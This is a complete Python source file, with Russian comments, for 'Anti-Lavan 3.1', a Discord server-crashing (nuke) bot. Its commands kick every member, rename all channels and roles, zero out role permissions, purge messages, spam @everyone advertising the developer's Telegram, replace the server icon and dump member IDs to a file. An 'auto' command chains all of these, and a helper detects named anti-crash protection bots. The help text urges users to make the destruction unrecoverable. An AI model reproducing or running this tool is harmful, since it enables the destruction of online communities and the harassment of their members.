# -*- coding: utf8 -*-
                        
cl = """
   db           w   w      8                           
  dPYb   8d8b. w8ww w      8    .d88 Yb  dP .d88 8d8b. 
 dPwwYb  8P Y8  8   8 wwww 8    8  8  YbdP  8  8 8P Y8 
dP    Yb 8   8  Y8P 8      8888 `Y88   YP   `Y88 8   8
                                                          
                                                          """
print(cl)

updates = 'Anti-Lavan 3.1 (открытый исходный код)\n\n[ 3.0 ]\n- Исправлена команда purge, она чистила только текущий канал, задумано было все\n- Теперь некоторые функции бота можно настроить\n- Изменен алгоритм краша\n- У бота теперь открытый исходный код!\n- Добавлены логи краша\n\n[ 3.1 ]\n- Добавлены потоки, как ни странно\n- Бот теперь использует requests для краша\n- Добавлена colorama\n- Добавлена команда find_anticrash'

# заранее извиняюсь за говнокод если он тут есть

import discord
import colorama
from colorama import Fore, init
from discord import *
from discord.ext import commands
import asyncio
import time
import requests as rq
from discord import Permissions
init()

print(Fore.GREEN)
# токен ТУТ(в коде) ставить не надо!
token = input('Введите токен бота --> ') # Эту строку трогать вообще не надо как и строки ниже
# просто при запуске start.bat вас попросит их ввести, тогда и введете!
print(Fore.YELLOW)
prefix = input('Укажите префикс боту --> ')
print(Fore.CYAN)
echo = input('Показать ли список изменений ( да / нет ) --> ')
if 'да' in str(echo.lower()):
    print(Fore.GREEN)
    print(updates + '\n')
else:
    pass

channelname = 'Crash By Anti-Lavan'
rolename = 'Crashed By Anti-Lavan'
reasonb = 'Сервер крашнут ботом Anti-Lavan'

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command('help') # удаляем встроенную команду хелпа

@client.event
async def on_ready():
    print(f'{Fore.YELLOW}[ LOG ] {client.user} запущен!')

async def sendrenchannel(chh):
        oldname = chh.name
        try:
            r = rq.patch(f'https://discord.com/api/v9/channels/{chh.id}',json={'name': channelname},headers={'authorization': f'Bot {token}'})
        except Exception as e:
            print(f'{Fore.RED}[ ERROR ] Не смог изменить имя каналу {oldname} на сервере {chh.guild.name}')
        else:
            print(f'{Fore.GREEN}[ LOG ] #{oldname} --> #{channelname}')

async def sendrenrole(rll):
        oldname = rll.name
        try:
            r = rq.patch(f'https://discord.com/api/v9/guilds/{rll.guild.id}/roles/{rll.id}',json={'name': rolename, 'permissions': '0'},headers={'authorization': f'Bot {token}'})
        except Exception as e:
            print(f'{Fore.RED}[ ERROR ] Не смог изменить имя роли @{oldname} и сбросить ей права на сервере {rll.guild.name}')
        else:
            print(f'{Fore.GREEN}[ LOG ] @{oldname} --> @{rolename} (права = 0)')

@client.command()
async def find_anticrash(ctx):
    await ctx.guild.chunk()
    foundbots = 'Найдены анти-краш-боты:'
    allbots = 0
    for member in ctx.guild.members:
        if str(member.name) in ['Lavan', 'Crash Protect', 'VEGA ⦡']:
            allbots +=1
            foundbots = foundbots + f'\n- {str(member.name)}'
    if allbots == 0:
        await ctx.send(embed=discord.Embed(title=':white_check_mark: Отлично, анти-краш-боты не найдены!', colour=discord.Colour.from_rgb(0,228,0)))
    else:
        await ctx.send(embed=discord.Embed(title=f':warning: Найдено {allbots} анти-краш-бот(а)',description=foundbots,colour=discord.Colour.from_rgb(228,0,0)))

@client.command()
async def rename_channels(ctx):
    for channel in ctx.guild.channels:
        try:
            asyncio.create_task(sendrenchannel(channel))
        except Exception as e:
            print(e)

@client.command()
async def kill_roles(ctx):
    for role in ctx.guild.roles:
        try:
            asyncio.create_task(sendrenrole(role))
        except:
            pass
        else:
            pass

@client.command()
async def purge(ctx):
    for channel in ctx.guild.text_channels:
        try:
            await channel.purge(limit=1000)
        except Exception as e:
            print(e)
            print(f'{Fore.RED}[ ERROR ] Не очистил сообщения на сервере {ctx.guild.name} в канале {channel.name}')
        else:
            print(f'{Fore.YELLOW}[ LOG ] Очистил 1000 сообщений в канале {channel.name} на сервере {ctx.guild.name}')

@client.command()
async def kick_all(ctx):
    for user in ctx.guild.members:
        if int(user.id) != int(ctx.message.author.id):
            try:
                await user.kick(reason=reasonb)
            except:
                print(f'{Fore.RED}[ ERROR ] Сервер {ctx.guild.name} | Не смог кикнуть участника {user.name}#{user.discriminator}')
            else:
                print(f'{Fore.YELLOW}[ LOG ] Кикнул участника {user.name}#{user.discriminator}')

@client.command()
async def icon(ctx):
    with open('bebra.png', 'rb') as f:
        avatar = f.read()
        await ctx.guild.edit(icon=avatar)
    print(f'{Fore.YELLOW}[ LOG ] Успешно изменил иконку серверу {ctx.guild.name}')

async def sendspam(channel):
        try:
            for _ in range(5):
                await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
        except:
            print(f'{Fore.RED}[ ERROR ] Не отправил спам на сервер {channel.guild.name} в канал #{channel.name}')


@client.command()
async def spam(ctx):
    for channel in ctx.guild.text_channels:
        try:
            asyncio.create_task(sendspam(channel))
        except:
            print(f'{Fore.RED}[ ERROR ] Ошибка при отправке спама на сервер {ctx.guild.name}')

@client.command()
async def auto(ctx):
    print(f'{Fore.GREEN}[ LOG ] Сервер {ctx.guild.name} | Краш запущен')
    for channel in ctx.guild.text_channels:
        try:
            asyncio.create_task(sendspam(channel))
        except:
            print(f'{Fore.RED}[ ERROR ] Ошибка при отправке спама на сервер {ctx.guild.name}')

    members = []
    await ctx.guild.chunk()
    for member in ctx.guild.members:
        members.append(member.id)

    with open(f'crash-{ctx.guild.id}.txt', 'w') as f:
        f.write(f'Список всех участников сервера {ctx.guild.id}:\n{members}\n(c) Anti-Lavan, 2021-2022')

    print(f'{Fore.GREEN}[ LOG ] Сервер {ctx.guild.name} | Собрал всех участников сервера в файл crash-{ctx.guild.id}.txt')

    with open('bebra.png', 'rb') as f:
        avatar = f.read()
        await ctx.guild.edit(icon=avatar)

    print(f'{Fore.GREEN}[ LOG ] Сервер {ctx.guild.name} | Изменена иконка серверу (имя нельзя)')
    
    try:
        asyncio.create_task(spam(ctx))
        asyncio.create_task(purge(ctx))
        asyncio.create_task(kick_all(ctx))
        asyncio.create_task(rename_channels(ctx))
        asyncio.create_task(kill_roles(ctx))
    except Exception as e:
        print(e)
        print(f'{Fore.RED}Ошибка при работе краша, попробуйте заного.')
    else:
        print(f'{Fore.GREEN}[ LOG ] Краш сервера {ctx.guild.name}: все потоки краша запущены. Спасибо за использование нашего бота!')

@client.command()
async def help(ctx):
    embed = discord.Embed(title='Список команд',
      description=f'Авто-краш сервера\n```py\n{prefix}auto```\nИзменить иконку сервера (название нельзя, лаван банит за это)\n```py\n{prefix}icon```\nПереименовать все каналы в "{channelname}"\n```py\n{prefix}rename_channels```\nКикнуть всех участников сервера\n```py\n{prefix}kick_all```\nПереименовать все роли в "{rolename} и убрать их права"\n```py\n{prefix}kill_roles```\nCпам во все каналы\n```py\n{prefix}spam```\nОчистить 1000 сообщений во всех каналах\n```py\n{prefix}purge```\nПоиск анти-краш-ботов на сервере\n```py\n{prefix}find_anticrash```\n\n**Чтобы все функции работали корректно, перемести мою роль как можно выше (необязательно выше чем лавана)**\n**После краша сервера пропиши l.save , чтобы сервер невозможно было восстановить :)**',
      colour=(discord.Colour.from_rgb(106, 192, 245)))
    await ctx.send(embed=embed)

try:
    client.run(token)
except:
    print(f'{Fore.RED}[ ERROR ] Ты ввёл неверный токен бота или не включил ему интенты!')
    input()
